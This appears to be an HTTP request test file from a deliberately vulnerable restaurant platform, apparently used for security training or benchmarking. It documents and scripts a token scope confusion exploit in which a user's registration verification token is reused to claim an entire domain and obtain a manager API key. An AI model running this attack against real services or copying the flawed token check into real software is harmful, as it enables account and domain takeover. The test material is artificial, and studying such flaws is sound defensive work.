# @import ../_imports.http

# =============================================================================
# VULNERABILITY: R03 Domain Tokens Accept Any Mailbox (token scope confusion)
# =============================================================================
#
# DESCRIPTION:
#   Restaurant registration sends a verification email to admin@domain and
#   verifies the token matches the claimed domain. However, it doesn't verify
#   that the token was actually sent to admin@ - any mailbox at the domain works.
#   This allows any user with an email at a domain to claim that domain.
#
# ATTACK SCENARIO:
#   Plankton (has account at random email provider):
#   1. Registers a regular user account as plankton@bmail.sea
#   2. Receives USER verification token (for account registration)
#   3. Uses that USER token to claim bmail.sea DOMAIN ownership
#   4. System only checks token.domain == claimed domain, not token.email == admin@domain
#
# IMPACT:
#   Domain takeover. Any user with any email address at a domain can claim
#   restaurant ownership of that domain, receiving a manager API key.
#
# STATUS: VULNERABLE in v306 (exploit succeeds)
#         When fixed (v307+), this test should be excluded.
# =============================================================================

# =============================================================================
# SETUP: Reset database
# =============================================================================

### Seed the database with fresh state
# @name seed
{{
  await platform.seed();
  await mailpit.clear();
  // Generate unique domain for this test run
  exports.testDomain = `bmail-${Date.now()}.sea`;
  exports.planktonEmail = `plankton@${exports.testDomain}`;
}}
# @ucskip
# @tag r03, restaurants, v306, vulnerable
GET /menu


# =============================================================================
# EXPLOIT: User token used to claim domain ownership
# =============================================================================

### Step 1: Plankton registers as a regular user at bmail.sea
# @name start_user_registration
# @forceRef seed
# @tag r03, restaurants, v306, vulnerable
POST /auth/register
Content-Type: application/json

{
  "email": "{{planktonEmail}}",
  "password": "password123"
}

?? js $(response).isOk() == true
?? js $(response).field("status") == verification_email_sent


### Step 2: Get the USER verification token (sent to plankton@, not admin@)
# @name get_user_token
# @forceRef start_user_registration
{{
  // Extract user registration token from email
  const token = await mailpit.lastEmail(planktonEmail).userToken();
  exports.userToken = token;
}}
# @tag r03, restaurants, v306, vulnerable
GET /menu

?? js exports.userToken != null


### Step 3: EXPLOIT - Use USER token to claim the DOMAIN
# Token is for plankton@ but we're claiming the entire domain
# @name exploit_domain_claim
# @forceRef get_user_token
# @tag r03, restaurants, v306, vulnerable
POST /restaurants
Content-Type: application/json

{
  "name": "Plankton's Evil Empire",
  "domain": "{{testDomain}}",
  "token": "{{userToken}}"
}

# VULNERABLE: Exploit succeeds - domain claimed with wrong token type
?? js $(response).status() == 201
?? js $(response).field("api_key") != null
